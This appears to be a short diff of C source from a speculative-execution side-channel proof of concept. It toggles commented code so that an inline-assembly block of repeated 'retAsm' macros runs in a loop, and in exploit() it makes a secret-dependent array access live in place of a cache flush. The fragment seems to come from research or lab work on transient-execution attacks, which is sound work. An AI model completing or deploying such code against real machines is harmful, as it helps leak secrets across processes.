@@ -35,28 +35,28 @@ void trickMe() {
 	ADDR_PTR address, tmp;
 
 	while(1) {
-		sched_yield();
-		exploit();
-		// asm(
-		// 	retAsm(1)
-		// 	retAsm(2)
-		// 	retAsm(3)
-		// 	retAsm(4)
-		// 	retAsm(5)
-		// 	retAsm(6)
-		// 	retAsm(7)
-		// 	retAsm(8)
-		// 	retAsm(9)
-		// 	retAsm(10)
-		// 	retAsm(11)
-		// 	retAsm(12)
-		// 	retAsm(13)
-		// 	retAsm(14)
-		// 	retAsm(15)
-		// 	retAsm(16)
-		// 	: "=r" (tmp)
-		// 	: "r" (address)
-		// );
+		// sched_yield();
+		// exploit();
+		asm(
+			retAsm(1)
+			retAsm(2)
+			retAsm(3)
+			retAsm(4)
+			retAsm(5)
+			retAsm(6)
+			retAsm(7)
+			retAsm(8)
+			retAsm(9)
+			retAsm(10)
+			retAsm(11)
+			retAsm(12)
+			retAsm(13)
+			retAsm(14)
+			retAsm(15)
+			retAsm(16)
+			: "=r" (tmp)
+			: "r" (address)
+		);
 	}
 }
 
@@ -72,8 +72,8 @@ volatile void spacer() {
 void exploit() { 
 	// this should be at the same VA as attacker:gadget()
 	// volatile int temp = array[secret*offset];
-	// volatile int temp = array[secret*offset];
-	clflush((void*)(&array[secret*offset]));
+	volatile int temp = array[secret*offset];
+	// clflush((void*)(&array[secret*offset]));
 }
 
 int main(){
